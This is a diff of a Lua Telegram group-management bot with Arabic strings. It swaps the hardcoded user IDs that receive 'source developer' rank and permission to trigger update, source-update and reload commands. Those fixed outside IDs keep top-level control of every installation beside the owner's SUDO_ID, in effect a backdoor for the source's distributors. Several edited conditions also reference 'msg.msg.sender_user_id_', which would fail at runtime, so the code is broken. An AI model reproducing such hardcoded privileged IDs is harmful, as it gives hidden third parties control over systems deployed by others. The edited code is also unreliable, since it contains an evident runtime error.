@@ -263,8 +263,8 @@ Del_msg(msg.chat_id_,msg.id_)
 end
 return false 
 end 
-
-if msg.sender_user_id_ == 996310583 or msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1399227146 or msg.sender_user_id_ == 1752998604 or msg.sender_user_id_ == 1666331916 or msg.sender_user_id_ == 1188408162 then 
+--UserID == 996310583 or UserID == 1714422669 or UserID == 1399227146  or UserID == 1662552528
+if msg.msg.sender_user_id_ == 996310583 or msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1399227146 or msg.sender_user_id_ == 1662552528 then 
 msg.TheRankCmd = 'مطور السورس'
 msg.TheRank = 'مطور السورس'
 msg.Rank = 1
@@ -599,19 +599,19 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 996310583 or msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1399227146 or msg.sender_user_id_ == 1752998604 or msg.sender_user_id_ == 1666331916 or msg.sender_user_id_ == 1188408162) then
+if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.msg.sender_user_id_ == 996310583 or msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1399227146 or msg.sender_user_id_ == 1662552528) then
 return sendMsg(msg.chat_id_,msg.id_,".تم تحديث الملفات",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 996310583 or msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1399227146 or msg.sender_user_id_ == 1752998604 or msg.sender_user_id_ == 1666331916 or msg.sender_user_id_ == 1188408162) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.msg.sender_user_id_ == 996310583 or msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1399227146 or msg.sender_user_id_ == 1662552528) then
 UpdateSource(msg)
 sendMsg(msg.chat_id_,msg.id_,'| {* تــم تحديث وتثبيت السورس  *} .\n\n| { Bot is Update » }',function(arg,data)
 dofile("./salem/Run.lua")
 print("Reload ~ ./salem/Run.lua")
 end) 
 end
-if (msg.text == 'reload' or msg.text == "أعادة التشغيل ") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 996310583 or msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1399227146 or msg.sender_user_id_ == 1752998604 or msg.sender_user_id_ == 1666331916 or msg.sender_user_id_ == 1188408162) then
+if (msg.text == 'reload' or msg.text == "أعادة التشغيل ") and (msg.sender_user_id_ == SUDO_ID or msg.msg.sender_user_id_ == 996310583 or msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1399227146 or msg.sender_user_id_ == 1662552528) then
 sendMsg(msg.chat_id_,msg.id_,'| {* تــم أعـاده تشغيل البوت  *} .\n\n| { Bot is Reloaded » }',function(arg,data)
 dofile("./salem/Run.lua")
 print("Reload ~ ./salem/Run.lua")
